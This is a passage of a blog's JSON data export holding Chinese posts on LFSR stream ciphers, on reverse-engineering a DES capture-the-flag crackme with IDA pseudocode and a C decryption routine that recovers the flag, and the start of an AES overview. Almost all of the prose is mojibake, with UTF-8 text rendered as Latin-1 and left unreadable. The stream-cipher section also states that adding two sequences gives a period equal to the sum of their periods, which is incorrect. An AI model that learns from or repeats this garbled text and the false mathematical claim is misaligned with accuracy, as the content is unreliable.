","slug":"cryp_æµå¯†ç ","date":"2021-04-01T17:24:39.000Z","updated":"2022-03-25T13:51:42.000Z","comments":true,"path":"2021/04/02/cryp_æµå¯†ç /","link":"","permalink":"http://example.com/2021/04/02/cryp_%E6%B5%81%E5%AF%86%E7%A0%81/","excerpt":"","text":"æµå¯†ç åŸºæœ¬æ¦‚å¿µæµå¯†ç ä¸€èˆ¬é€å­—èŠ‚æˆ–è€…é€æ¯”ç‰¹å¤„ç†ä¿¡æ¯ã€‚ ç‰¹ç‚¹ï¼š æµå¯†ç çš„å¯†é’¥é•¿åº¦ä¼šä¸æ˜æ–‡çš„é•¿åº¦ç›¸åŒã€‚ æµå¯†ç çš„å¯†é’¥æ´¾ç”Ÿè‡ªä¸€ä¸ªè¾ƒçŸ­çš„å¯†é’¥ï¼Œæ´¾ç”Ÿç®—æ³•é€šå¸¸ä¸ºä¸€ä¸ªä¼ªéšæœºæ•°ç”Ÿæˆç®—æ³•ã€‚ ç±»å‹ï¼šå¯¹ç§°åŠ å¯†ã€‚ ä¼ªéšæœºæ•°ç”Ÿæˆç®—æ³•ç”Ÿæˆçš„åºåˆ—çš„éšæœºæ€§è¶Šå¼ºï¼Œæ˜æ–‡ä¸­çš„ç»Ÿè®¡ç‰¹å¾è¢«è¦†ç›–çš„æ›´å¥½ã€‚ æµå¯†ç åŠ è§£å¯†éå¸¸ç®€å•ï¼Œåœ¨å·²çŸ¥æ˜æ–‡çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥éå¸¸å®¹æ˜“åœ°è·å–å¯†é’¥æµã€‚ æµå¯†ç çš„å…³é”®åœ¨äºè®¾è®¡å¥½çš„ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œä¼ªéšæœºæ•°ç”Ÿæˆå™¨çš„åŸºæœ¬æ„é€ æ¨¡å—ä¸ºåé¦ˆç§»ä½å¯„å­˜å™¨ã€‚å½“ç„¶ï¼Œä¹Ÿæœ‰ä¸€äº›ç‰¹æ®Šè®¾è®¡çš„æµå¯†ç ï¼Œæ¯”å¦‚ RC4ã€‚ åŸºäºLFSRçš„PRGçº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨LFSRæ¦‚å¿µï¼šçº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨æ˜¯æŒ‡æœ‰nä¸ªå¯„å­˜å™¨ï¼ˆç§°ä¸ºn-çº§ç§»ä½å¯„å­˜å™¨ï¼‰R1,R2,â€¦,Rnä»å³åˆ°å·¦æ’åˆ—ï¼Œæ¯ä¸ªå¯„å­˜å™¨ä¸­èƒ½å­˜æ”¾1ä½äºŒè¿›åˆ¶æ•°ï¼Œæ‰€æœ‰å¯„å­˜å™¨ä¸­çš„æ•°å¯ä»¥ç»Ÿä¸€å‘å³ï¼ˆæˆ–å‘å·¦ï¼‰ç§»åŠ¨1ä½ï¼Œç§°ä¸ºè¿›åŠ¨1æ‹. å³R1çš„å€¼(b1)å³ç§»1ä½åè¾“å‡ºï¼Œç„¶åR2çš„å€¼(b2)é€R1 , R3çš„å€¼(b3)é€R2,â€¦â€¦æœ€åï¼ŒRnçš„å€¼(bn)é€Rn-1. LFSRè¿è¡ŒåŸºæœ¬æ“ä½œï¼š åˆå§‹åŒ–ã€‚é¦–å…ˆï¼ŒLFSRä¼šä»¥ç»™å®šçš„ç§å­ï¼ˆå³å¯†é’¥ï¼‰åˆå§‹åŒ–å¯„å­˜å™¨ï¼Œä»¥ä½ï¼ˆæ¯”ç‰¹ï¼‰ä¸ºå•ä½ï¼š 2. æŠ½å¤´ã€‚éšåï¼ŒLFSRä»è¿™äº›æ¯”ç‰¹ä½ä¸­éšæœºé€‰å–ä¸€äº›ï¼ˆç§°ä½œâ€œæŠ½å¤´â€ï¼‰ï¼Œå¹¶è®¡ç®—è¿™äº›æŠ½å¤´çš„å¼‚æˆ–ï¼š 3. ä½ç§»å¹¶é™„åŠ ã€‚æœ€åï¼ŒLFSRå°†è¿™äº›æŠ½å¤´å¼‚æˆ–çš„ç»“æœé™„åŠ åˆ°å¯„å­˜å™¨å¼€å¤´ï¼Œå¹¶ä½¿å¯„å­˜å™¨å‘å³ä½ç§»ï¼Œæœ€åä¸€ä¸ªæ¯”ç‰¹ä½ä½œä¸ºç»“æœè¾“å‡ºï¼š åˆå§‹åŒ–å¯„å­˜å™¨åï¼Œæ¯ä¸ªæ—¶é’Ÿå‘¨æœŸLFSRå°†æ‰§è¡Œé‡å¤ä¸Šè¾¹è¿™äº›æ­¥éª¤ï¼Œé€‰å–ä¸€äº›æŠ½å¤´ï¼Œå°†å®ƒä»¬å¼‚æˆ–ï¼Œéšåå¯„å­˜å™¨å³ç§»è¾“å‡ºæœ€å³ä¸€ä½å¹¶å°†å¼‚æˆ–ç»“æœé™„åŠ åˆ°å¯„å­˜å™¨å¼€å¤´ã€‚ Math_Analyseï¼šçº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨çš„åé¦ˆå‡½æ•°ä¸€èˆ¬å¦‚ä¸‹ a_{i+n}={\\sum_{j=1}^{n}c_ja_{i+n-j}} å…¶ä¸­ï¼Œc_j å‡åœ¨æŸä¸ªæœ‰é™åŸŸ F_q ä¸­ã€‚æ—¢ç„¶çº¿æ€§ç©ºé—´æ˜¯ä¸€ä¸ªçº¿æ€§å˜æ¢ï¼Œæˆ‘ä»¬å¯ä»¥å¾—çŸ¥è¿™ä¸ªçº¿æ€§å˜æ¢ä¸º è¿›è€Œï¼Œæˆ‘ä»¬å¯ä»¥æ±‚å¾—å…¶ç‰¹å¾å¤šé¡¹å¼ä¸º f(x)=x^nâˆ’{\\sum_{i=1}^{n}(c_ix^i)}åŒæ—¶ï¼Œæˆ‘ä»¬å®šä¹‰å…¶äº’åå¤šé¡¹å¼ä¸º \\overline{f_{(x)}}=1-x^nf(\\frac{1}{x})æˆ‘ä»¬ä¹Ÿç§°äº’åå¤šé¡¹å¼ä¸ºçº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨çš„è”ç»“å¤šé¡¹å¼ã€‚ ç‰¹å¾å¤šé¡¹å¼å’Œç”Ÿæˆå‡½æ•°ç‰¹å¾å¤šé¡¹å¼ P(x)=1+c_1x+c_2x^2+...+c_nx^nåºåˆ—å‘¨æœŸä¸ç”Ÿæˆå‡½æ•°åºåˆ—çš„çš„å‘¨æœŸä¸ºå…¶ç”Ÿæˆå‡½æ•°çš„æ—¢çº¦çœŸåˆ†å¼çš„åˆ†æ¯çš„å‘¨æœŸã€‚ å¯¹äº n çº§çº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨ï¼Œæœ€é•¿å‘¨æœŸä¸º 2^nâˆ’1ï¼ˆæ’é™¤å…¨é›¶ï¼‰ã€‚è¾¾åˆ°æœ€é•¿å‘¨æœŸçš„åºåˆ—ä¸€èˆ¬ç§°ä¸º m åºåˆ—ã€‚ å°†ä¸¤ä¸ªåºåˆ—ç´¯åŠ å¾—åˆ°æ–°çš„åºåˆ—çš„å‘¨æœŸä¸ºè¿™ä¸¤ä¸ªåºåˆ—çš„å‘¨æœŸçš„å’Œã€‚ åºåˆ—æ˜¯ n çº§ m åºåˆ—ï¼Œå½“ä¸”ä»…å½“åºåˆ—çš„æå°å¤šé¡¹å¼æ˜¯ n æ¬¡æœ¬åŸå¤šé¡¹å¼ã€‚","categories":[{"name":"cryptography","slug":"cryptography","permalink":"http://example.com/categories/cryptography/"}],"tags":[{"name":"æµå¯†ç ","slug":"æµå¯†ç ","permalink":"http://example.com/tags/%E6%B5%81%E5%AF%86%E7%A0%81/"}]},{"title":"DESé€†å‘åˆ†æ","slug":"cryp_DESé€†å‘","date":"2021-03-30T17:24:39.000Z","updated":"2022-03-25T13:51:42.000Z","comments":true,"path":"2021/03/31/cryp_DESé€†å‘/","link":"","permalink":"http://example.com/2021/03/31/cryp_DES%E9%80%86%E5%90%91/","excerpt":"","text":"DESåŠ å¯†è¿‡ç¨‹å›é¡¾DESæ˜¯ä¸€ä¸ªåˆ†ç»„åŠ å¯†ç®—æ³•ï¼Œå…¸å‹çš„DESä»¥64ä½ä¸ºåˆ†ç»„å¯¹æ•°æ®åŠ å¯†ï¼ŒåŠ å¯†å’Œè§£å¯†ç”¨çš„æ˜¯åŒä¸€ä¸ªç®—æ³•ã€‚æ•´ä¸ªDESåŠ å¯†è¿‡ç¨‹ï¼Œå¯ä»¥å¤§è‡´åˆ†ä¸ºå¦‚ä¸‹å‡ ä¸ªé˜¶æ®µï¼š åˆå§‹ç½®æ¢ã€ç”Ÿæˆå­å¯†é’¥ã€è¿­ä»£è¿‡ç¨‹ã€æœ€åé€†ç½®æ¢ ï¼ˆå…¶ä¸­è¿­ä»£è¿‡ç¨‹åŒ…æ‹¬ï¼šæ‰©å±•ç½®æ¢Eã€Sç›’ä»£æ›¿ã€Pç›’ç½®æ¢ï¼‰ åˆå§‹IPç½®æ¢ï¼š åŠ å¯†å¼€å§‹æ—¶ï¼Œå¯¹è¾“å…¥çš„é•¿åº¦ä¸º64ä½çš„æ˜æ–‡ï¼Œè¿›è¡Œåˆå§‹ç½®æ¢ IPIPã€‚å…¶ç½®æ¢æ–¹å¼å¦‚ä¸‹å›¾ä¸­ 8Ã—88Ã—8 çš„è¡¨æ ¼æ‰€ç¤ºï¼š 58 50 42 34 26 18 10 2 60 52 44 36 28 20 12 4 62 54 46 38 30 22 14 6 64 56 48 40 32 24 16 8 57 49 41 33 25 17 9 1 59 51 43 35 27 19 11 3 61 53 45 37 29 21 13 5 63 55 47 39 31 23 15 7 å³ï¼šè¡¨ä¸­çš„æ•°å­—ä»£è¡¨æ–°æ•°æ®ä¸­æ­¤ä½ç½®çš„æ•°æ®åœ¨åŸæ•°æ®ä¸­çš„ä½ç½®ï¼Œå³åŸæ•°æ®å—çš„ç¬¬58ä½æ”¾åˆ°æ–°æ•°æ®çš„ç¬¬1ä½ å­å¯†é’¥ç”Ÿæˆï¼š DES åŠ å¯†å…±æ‰§è¡Œ16æ¬¡è¿­ä»£ï¼Œæ¯æ¬¡è¿­ä»£è¿‡ç¨‹çš„æ•°æ®é•¿åº¦ä¸º48ä½ï¼Œå› æ­¤éœ€è¦16ä¸ª48ä½çš„å­å¯†é’¥æ¥è¿›è¡ŒåŠ å¯†ï¼Œç”Ÿæˆå­å¯†é’¥çš„è¿‡ç¨‹å¦‚ä¸‹ï¼š è¿­ä»£è¿‡ç¨‹ï¼š Eæ‰©å±•ï¼š 32 1 2 3 4 5 4 5 6 7 8 9 8 9 10 11 12 13 12 13 14 15 16 17 16 17 18 19 20 21 20 21 22 23 24 25 24 25 26 27 28 29 28 29 30 31 32 1 ç»è¿‡ Eæ‰©å±• çš„å˜æ¢ï¼Œç»“æœä¸­çš„å„ä½ï¼Œä¾æ¬¡ä¸ºè¾“å…¥çš„ç¬¬32, 1, 2, â€¦, 32, 1ä½ã€‚å¯ä»¥çœ‹åˆ°ï¼Œè¾“å…¥çš„æœ‰äº›ä½ï¼Œåœ¨è¾“å‡ºä¸­é‡å¤å‡ºç°äº†ã€‚æ‰€ä»¥è¾“å‡ºçš„ä½æ•°ï¼Œç”±è¾“å…¥æ—¶çš„32ï¼Œå¢åŠ åˆ°äº†48ã€‚ Sç›’æ›¿æ¢ï¼š Eæ‰©å±•å¾—åˆ°çš„ç»“æœä»ç„¶æ˜¯48ä½çš„ã€‚å°†å…¶æ¯6ä½ç¼–ä¸ºä¸€ç»„ï¼Œå…±8ç»„è®°ä¸ºï¼š B_{1}B_{2}B_{3}B_{4}B_{5}B_{6}B_{7}B_{8}ç„¶åï¼Œå¯¹æ¯ä¸€ä¸ª Biï¼Œä½¿ç”¨å¯¹åº”çš„S-boxè¿›è¡Œå˜æ¢ï¼Œå¹¶å°†ç»“æœç»§ç»­æ‹¼æ¥èµ·æ¥ã€‚ å¯¹äºé•¿åº¦ä¸º6ä½çš„è¾“å…¥ï¼Œæ ¹æ®å…¶ç¬¬1, 6ä½ç¡®å®šæ‰€åœ¨è¡Œï¼Œå†æ ¹æ®å…¶ç¬¬2è‡³5ä½ç¡®å®šæ‰€åœ¨åˆ—ï¼Œæ‰¾åˆ°å¯¹åº”çš„å€¼ï¼Œå³ä¸ºsboxçš„è¾“å‡ºç»“æœã€‚ S1 x0000x x0001x x0010x x0011x x0100x x0101x x0110x x0111x x1000x x1001x x1010x x1011x x1100x x1101x x1110x x1111x 0yyyy0 14 4 13 1 2 15 11 8 3 10 6 12 5 9 0 7 0yyyy1 0 15 7 4 14 2 13 1 10 6 12 11 9 5 3 8 1yyyy0 4 1 14 8 13 6 2 11 15 12 9 7 3 10 5 0 1yyyy1 15 12 8 2 4 9 1 7 5 11 3 14 10 0 6 13 ï¼Œå¦‚æœè¾“å…¥æ˜¯ 011011ï¼Œé‚£ä¹ˆå…¶å˜æ¢çš„ç»“æœæ˜¯åœ¨ç¬¬2è¡Œï¼Œå€’æ•°ç¬¬3åˆ—ï¼Œå€¼ä¸º5=0101ã€‚æ‰€ä»¥ï¼š S_{1}(011011)=0101å¯¹äºè¿™8ä¸ª Biï¼Œé€šè¿‡ SiSi å…¨éƒ¨è®¡ç®—å®Œæˆåå†æ‹¼æ¥ï¼Œå¾—åˆ°é•¿åº¦ä¸º32ä½çš„ç»“æœï¼š Pç›’ç½®æ¢ï¼š 16 7 20 21 29 12 28 17 1 15 23 26 5 18 31 10 2 8 24 14 32 27 3 9 19 13 30 6 22 11 4 25 è¡¨ä¸­çš„æ•°å­—ä»£è¡¨åŸæ•°æ®ä¸­æ­¤ä½ç½®çš„æ•°æ®åœ¨æ–°æ•°æ®ä¸­çš„ä½ç½®ï¼Œå³åŸæ•°æ®å—çš„ç¬¬16ä½æ”¾åˆ°æ–°æ•°æ®çš„ç¬¬1ä½ï¼Œç¬¬7ä½æ”¾åˆ°ç¬¬2ä½ï¼Œâ€¦â€¦ä¾æ­¤ç±»æ¨ï¼Œç¬¬25ä½æ”¾åˆ°ç¬¬32ä½ã€‚ æœ€åIPé€†ç½®æ¢ï¼š 40 8 48 16 56 24 64 32 39 7 47 15 55 23 63 31 38 6 46 14 54 22 62 30 37 5 45 13 53 21 61 29 36 4 44 12 52 20 60 28 35 3 43 11 51 19 59 27 34 2 42 10 50 18 58 26 33 1 41 9 49 17 57 25 ä»¥ä¸Šæ˜¯å¯¹DESåŠ å¯†ç®—æ³•çš„ç®€å•å›é¡¾ ä¸‹é¢æˆ‘ä»¬ä»¥desenc.exeä¸ºå®ä¾‹å¯¹DESåŠ å¯†å‡½æ•°è¿›è¡Œå…·ä½“åˆ†æ è¿è¡Œè¯¥å°ç¨‹åºåå‘ç°æˆ‘ä»¬éœ€è¦è¾“å…¥ä¸€ä¸ªè¢«åŠ å¯†çš„å­—ç¬¦ä¸²ï¼Œæµ‹è¯•åå‘ç°ï¼Œæˆ‘ä»¬è¾“å…¥æŸä¸ªæ­£ç¡®çš„å…«ä½å­—ç¬¦ä¸²å³å¯è·å–flag. ä¸‹é¢å€ŸåŠ©IDAå¯¹å…¶ä¸­çš„å…³é”®å‡½æ•°è¿›è¡Œåˆ†æï¼š mainå‡½æ•°åˆ†æ é¦–å…ˆå€ŸåŠ©IDAçš„F5åç¼–è¯‘æ’ä»¶æŸ¥çœ‹mainå‡½æ•°ä¼ªä»£ç ï¼Œè·å–åŠ å¯†å¤§è‡´æµç¨‹ï¼š é¦–å…ˆå­—ç¬¦ä¸²â€DE3_En1câ€è¢«æ”¾å…¥v7å­—ç¬¦æ•°ç»„ä¸­ï¼Œæ ¹æ®å…¶ä¸º8å­—èŠ‚å…±64bitè€Œä¸”æ­¤ç¨‹åºä¸ºåŠ å¯†å‡½æ•°å¯ä»¥åˆ†æå‡ºv7å­—ç¬¦æ•°ç»„åº”è¯¥å‚¨å­˜çš„æ˜¯å¯†é’¥ å…¶æ¬¡è·å–ç”¨æˆ·è¾“å…¥å¹¶å°†ç”¨æˆ·è¾“å…¥å‚¨å­˜åœ¨Strå­—ç¬¦æ•°ç»„ä¸­ï¼Œåˆ¤æ–­æ­¤ä¸ºæ˜æ–‡è¾“å…¥ æ¥ç€å¯¹ç”¨æˆ·è¾“å…¥é•¿åº¦è¿›è¡Œåˆ¤æ–­ï¼Œè‹¥ç”¨æˆ·è¾“å…¥å­—ç¬¦é•¿åº¦ä¸º8åˆ™è¿›å…¥åŠ å¯†å­ç¨‹åº sub_40100F((int)v7)æ ¹æ®è¯¥å‡½æ•°å¤„ç†çš„æ•°æ®ä¸ºå¯†é’¥v7,çŒœæµ‹æ­¤å‡½æ•°ä¸ºå¯†é’¥ç”Ÿæˆå‡½æ•° sub_401032(Str, v5);æ ¹æ®è¾“å…¥å‚æ•°å¯ä»¥çŒœæµ‹æ­¤å‡½æ•°å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡ŒåŠ å¯†å¹¶å°†åŠ å¯†åå¯†æ–‡å‚¨å­˜åœ¨v5å­—ç¬¦æ•°ç»„ä¸­ æœ€åå°†å¯†æ–‡åŒæŒ‡å®šçš„å­—ç¬¦æ•°ç»„è¿›è¡Œæ¯”è¾ƒï¼Œè‹¥ä¸€è‡´åˆ™æœ€ç»ˆå¯ä»¥get flag ä¸‹é¢å¯¹å­å¯†é’¥ç”Ÿæˆæ¨¡å—å’ŒåŠ å¯†è¿­ä»£è¿‡ç¨‹æ¨¡å—è¿‡ç¨‹è¿›è¡Œé‡ç‚¹åˆ†æï¼š DESå­å¯†é’¥ç”Ÿæˆæ¨¡å—åˆ†æsub_40100F((int)v7)è·Ÿè¿›è¯¥å‡½æ•°ï¼š sub_40101E(a1, v6, 8)åˆ†æ è¯¥å‡½æ•°å‚æ•°ä¸ºa1,v6,8 è¯¥å‡½æ•°å°†å›ºå®šçš„æ•°æ®a1ä½œä¸ºå‚æ•°å¤„ç†ï¼Œå°†ç»“æœå‚¨å­˜åœ¨æ ˆç©ºé—´v6ä¸­ã€‚ è¯¥å‡½æ•°å–å‚æ•°ä¸­æ¯ä¸€å­—èŠ‚æ•°æ®çš„æ¯ä¸€ä½ï¼Œå¹¶å°†æ¯ä¸€ä½æ•°æ®å†æ”¾å…¥ä¸€ä¸ªå­—èŠ‚ä¸­ã€‚ result = (void *)sub_401046(v6, v4);åˆ†æ è·Ÿè¿›å‡½æ•°sub_401046(v6, v4) è¯¥å‡½æ•°åˆ©ç”¨æ ˆä¸­æ•°æ®v6ä½œä¸ºå‚æ•°è¿›è¡Œ56è½®çš„å¤„ç†ï¼Œæ¯ä¸€è½®å¾ªç¯éƒ½æ˜¯æ ¹æ®å­—èŠ‚ æ•°ç»„0x4280ECå¤„çš„å€¼æ¥å°†v6ä¸­çš„æ•°æ®æ”¾å…¥è¾“å‡ºåœ°å€a2å¤„ï¼Œ ç»è¿‡è¯¥å‡½æ•°ï¼Œè¾“å…¥çš„64å­—èŠ‚æ•°æ®å˜æˆäº†56å­—èŠ‚æ•°æ®ï¼Œè¿™æ˜¯å­å¯†é’¥ç”Ÿæˆç®—æ³•çš„çš„ç¬¬ä¸€æ­¥PC-1ç½®æ¢é€‰æ‹© æ¥ä¸‹æ¥åº”è¯¥æ˜¯ä¸¤éƒ¨åˆ†å­å¯†é’¥è¿›è¡Œå¾ªç¯å·¦ç§»çš„è¿‡ç¨‹ sub_401014(v4, (int)v4, byte_428154[i]);åˆ†æï¼š å‡½æ•°sub_4014F0å°±æ˜¯å¾ªç¯ç§»ä½çš„å‡½æ•°ï¼Œåˆ†åˆ«å¯¹ 56ä½å¯†é’¥ä¸­çš„å·¦å³ä¸¤ä¸ªå­å¯†é’¥è¿›è¡Œç§»ä½ã€‚ ç»è¿‡16è½®å¾ªç¯ç”Ÿæˆ16ç»„å­å¯†é’¥ DESåŠ å¯†æ¨¡å—åˆ†æsub_401032(Str, v5) è·Ÿè¿›è¯¥å‡½æ•° sub_40101E(a1, (int)Src, 8)åˆ†æï¼š è¯¥å‡½æ•°åŒå­å¯†é’¥ç”Ÿæˆæ¨¡å—ç¬¬ä¸€ä¸ªå‡½æ•°ä¸€æ ·ï¼šå°†ç”¨æˆ·çš„è¾“å…¥ä¸­çš„æ¯ä¸€ä½æå–å‡ºæ¥è½¬æ¢æˆä¸€ä¸ª64å­—èŠ‚çš„æ•°ç»„ï¼› sub_401028(Src, (int)Src);åˆ†æ è·Ÿè¿›è¯¥å‡½æ•°ï¼š è¯¥éƒ¨åˆ†0å¯¹è¿™64å­—èŠ‚æ•°ç»„è¿›è¡Œå¤„ç†ï¼Œå³åŠ å¯†è¿‡ç¨‹ä¸­çš„IPç½®æ¢ï¼› ä¸¤æ¬¡memcpyè°ƒç”¨åˆ†æï¼š è·Ÿè¿›å‡½æ•°ç»“åˆDESè¿‡ç¨‹åˆ†æè¿™éƒ¨åˆ†åˆ†æˆäº†å·¦å³ä¸¤ä¸ªåˆ†ç»„ åå…­è½®å¾ªç¯è¿­ä»£éƒ¨åˆ†ï¼š forå¾ªç¯å®Œæˆå‰åäº”è½®è¿­ä»£ forå¾ªç¯åå®Œæˆæœ€åä¸€è½®è¿­ä»£ sub_401005((int)v3, v5, (int)&amp;unk_42DC9C + 48 * i);åˆ†æï¼š sub_40104B(a1, (int)v5) 1234567891011121314unsigned __int8 __cdecl sub_401660(void *Src, int a2)&#123; unsigned __int8 result; // al int i; // [esp+4Ch] [ebp-34h] char v4[48]; // [esp+50h] [ebp-30h] BYREF result = (unsigned __int8)memcpy(v4, Src, sizeof(v4)); for ( i = 0; i &lt; 48; ++i ) &#123; result = *((_BYTE *)&amp;i + byte_42809C[i] + 3); *(_BYTE *)(i + a2) = result; &#125; return result;&#125; a1ä¸ºä¸€ä¸ª32å­—èŠ‚çš„æ•°æ®ï¼Œv5åˆ™æ˜¯åˆ†é…çš„æ ˆä¸Šçš„ ç©ºé—´ï¼Œå¤§å°ä¸º0x30ï¼ˆ48ï¼‰å­—èŠ‚ï¼Œè·Ÿè¿›è¯¥å‡½æ•°å¯çŸ¥è¿™éƒ¨åˆ†ä¸ºEæ‰©å±• sub_401023(v5, a3, 48)å‡½æ•°: 1234567891011int __cdecl sub_401900(int a1, int a2, int a3)&#123; int result; // eax int i; // [esp+4Ch] [ebp-4h] for ( i = 0; i &lt; a3; ++i ) &#123; *(_BYTE *)(i + a1) = (*(_BYTE *)(i + a2) + *(_BYTE *)(i + a1)) &amp; 1; result = i + 1; &#125; return result; è¯¥å‡½æ•°å°†ç¬¬ä¸€ä¸ªå‚æ•°å’Œç¬¬äºŒä¸ªå‚æ•°é€å­—èŠ‚çš„ç›¸åŠ ï¼Œå¹¶å°†ç»“æœâ€˜ä¸â€™ ä¸Š0x1ï¼ˆä¹Ÿå³å–æœ€ä½ä½ï¼‰ï¼Œè¿™å…¶å®å°±æ˜¯å¼‚æˆ–çš„æ“ä½œï¼Œ ä¹Ÿæ˜¯æ ‡å‡†DESåŠ å¯†è¿‡ç¨‹ä¸­å³è¾¹åˆ†ç»„ç»æ‰©å±•ç½®æ¢åä¸ å¯†é’¥è¿›è¡Œå¼‚æˆ–çš„éƒ¨åˆ† sub_40103C(v5, Src) 1234567891011121314151617181920212223int __cdecl sub_4016F0(int a1, int a2)&#123; int result; // eax char v3; // [esp+4Ch] [ebp-14h] int v4; // [esp+58h] [ebp-8h] int v5; // [esp+5Ch] [ebp-4h] v5 = 0; v4 = 0; while ( v5 &lt; 8 ) &#123; v3 = byte_428164[64 * v5 + 16 * ((*(_BYTE *)(a1 + 6 * v5 + 5) | (unsigned __int8)(2 * *(_BYTE *)(a1 + 6 * v5))) &amp; 3) + ((*(_BYTE *)(a1 + 6 * v5 + 4) | (unsigned __int8)((2 * *(_BYTE *)(a1 + 6 * v5 + 3)) | (4 * *(_BYTE *)(a1 + 6 * v5 + 2)) | (8 * *(_BYTE *)(a1 + 6 * v5 + 1)))) &amp; 0xF)] &amp; 0xF; *(_BYTE *)(v4 + a2) = (v3 &gt;&gt; 3) &amp; 1; *(_BYTE *)(v4 + a2 + 1) = (v3 &gt;&gt; 2) &amp; 1; *(_BYTE *)(v4 + a2 + 2) = (v3 &gt;&gt; 1) &amp; 1; *(_BYTE *)(v4 + a2 + 3) = v3 &amp; 1; v4 += 4; result = ++v5; &#125; return result;&#125; æ ¹æ®è¿­ä»£æµç¨‹çŒœæµ‹æ­¤å‡½æ•°ä¸ºS-boxæ›¿æ¢ï¼ŒæŸ¥è¡¨å°†6bitæ•°æ®æ›¿æ¢ä¸º4bitæ•°æ® sub_401037(Src, (int)Src) 1234567891011121314unsigned __int8 __cdecl sub_401870(void *Src, int a2)&#123; unsigned __int8 result; // al int i; // [esp+4Ch] [ebp-24h] char v4[32]; // [esp+50h] [ebp-20h] BYREF result = (unsigned __int8)memcpy(v4, Src, sizeof(v4)); for ( i = 0; i &lt; 32; ++i ) &#123; result = *((_BYTE *)&amp;i + byte_4280CC[i] + 3); *(_BYTE *)(i + a2) = result; &#125; return result;&#125; è¯¥å‡½æ•°å®ŒæˆPç½®æ¢éƒ¨åˆ† Expå¯è½¬åŒ–ä¸ºï¼šå·²çŸ¥åŠ å¯†æµç¨‹ä¸ºDESï¼Œå¯†é’¥DE3_En1Cï¼šï¼ŒåŠ å¯†åå¯†æ–‡ï¼Œæ±‚æ˜æ–‡ã€‚ 123456789101112131415int main()&#123; unsigned char key[9] = &quot;DE3_En1C&quot;; unsigned char plaintext[20]; unsigned char ciphertext[8]=&#123;0xef,0x34,0xd4,0xa3,0xc6,0x84,0xe4,0x23&#125;; //to generate 16 round subkey get_subkey(key); //to encrypt plaintext decryption(ciphertext,plaintext); plaintext[8]=&#x27;\\0&#x27;; printf(&quot;%s\\n&quot;,plaintext); system(&quot;pause&quot;); return 0;&#125; Finally :)","categories":[{"name":"cryptographyã€é€†å‘","slug":"cryptographyã€é€†å‘","permalink":"http://example.com/categories/cryptography%E3%80%81%E9%80%86%E5%90%91/"}],"tags":[{"name":"DESã€IDAé€†å‘","slug":"DESã€IDAé€†å‘","permalink":"http://example.com/tags/DES%E3%80%81IDA%E9%80%86%E5%90%91/"}]},{"title":"AESåˆ†æ","slug":"cryp_AES","date":"2021-03-27T17:24:39.000Z","updated":"2022-03-25T13:51:42.000Z","comments":true,"path":"2021/03/28/cryp_AES/","link":"","permalink":"http://example.com/2021/03/28/cryp_AES/","excerpt":"","text":"AESåŸºæœ¬ä»‹ç»Advanced Encryption Standardï¼ˆAESï¼‰ï¼Œé«˜çº§åŠ å¯†æ ‡å‡†ï¼Œæ˜¯å…¸å‹çš„å—åŠ å¯†ï¼Œè¢«è®¾è®¡æ¥å–ä»£ DESï¼Œç”± Joan Daemen å’Œ Vincent Rijmen æ‰€è®¾è®¡ã€‚å…¶åŸºæœ¬ä¿¡æ¯å¦‚ä¸‹ è¾“å…¥ï¼š128 æ¯”ç‰¹ã€‚ è¾“å‡ºï¼š128 æ¯”ç‰¹ã€‚ SPN ç½‘ç»œç»“æ„ã€‚ è¿‡ç¨‹ä¸»è¦åŒ…æ‹¬å­—èŠ‚æ›¿ä»£ã€è¡Œç§»ä½ã€åˆ—æ··æ·†å’Œè½®å¯†é’¥åŠ  å…¶è¿­ä»£è½®æ•°ä¸å¯†é’¥é•¿åº¦æœ‰å…³ç³»ï¼Œå¦‚ä¸‹ å¯†é’¥é•¿åº¦ï¼ˆæ¯”ç‰¹ï¼‰ è¿­ä»£è½®æ•° 128 10 192 12 256 14 åŸºæœ¬æµç¨‹åŸºæœ¬æ¦‚å¿µåœ¨ AES åŠ è§£å¯†è¿‡ç¨‹ä¸­ï¼Œæ¯ä¸€å—éƒ½æ˜¯ 128 æ¯”ç‰¹ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œæ˜ç¡®ä¸€äº›åŸºæœ¬æ¦‚å¿µã€‚ åœ¨ AES ä¸­ï¼Œå—ä¸ State ä¹‹é—´çš„è½¬æ¢è¿‡ç¨‹å¦‚ä¸‹ æ‰€ä»¥ï¼Œå¯ä»¥çœ‹å‡ºï¼Œæ¯ä¸€ä¸ª block ä¸­çš„å­—èŠ‚æ˜¯æŒ‰ç…§åˆ—æ’åˆ—è¿›å…¥åˆ°çŠ¶æ€æ•°ç»„çš„ã€‚ è€Œå¯¹äºæ˜æ–‡æ¥è¯´ï¼Œä¸€èˆ¬æˆ‘ä»¬ä¼šé€‰æ‹©ä½¿ç”¨å…¶åå…­è¿›åˆ¶è¿›è¡Œç¼–ç ã€‚ åŠ è§£å¯†è¿‡ç¨‹è¿™é‡Œç»™ä¸ªçœ‹é›ªä¸Šæ¯”è¾ƒå¥½çš„ å›¾ä¾‹ ï¼Œä»¥ä¾¿äºä»‹ç»åŸºæœ¬çš„æµç¨‹ï¼Œæ¯ä¸€è½®ä¸»è¦åŒ…æ‹¬ è½®å¯†é’¥åŠ ï¼ŒAddRoundKey å­—èŠ‚æ›¿æ¢ï¼ŒSubBytes è¡Œç§»ä½ï¼ŒShiftRows åˆ—æ··æ·†ï¼ŒMixColumns ä¸Šé¢çš„åˆ—æ··æ·†çš„çŸ©é˜µä¹˜æ³•ç­‰å·å·¦è¾¹çš„åˆ—å‘é‡åº”è¯¥åœ¨å³è¾¹ã€‚ è¿™é‡Œå†ç»™ä¸€å¼ å…¶åŠ è§£å¯†çš„å…¨å›¾ï¼Œå…¶è§£å¯†ç®—æ³•çš„æ­£ç¡®æ€§å¾ˆæ˜¾ç„¶ã€‚ æˆ‘ä»¬è¿™é‡Œé‡ç‚¹å…³æ³¨ä¸€ä¸‹ä»¥ä¸‹ã€‚ 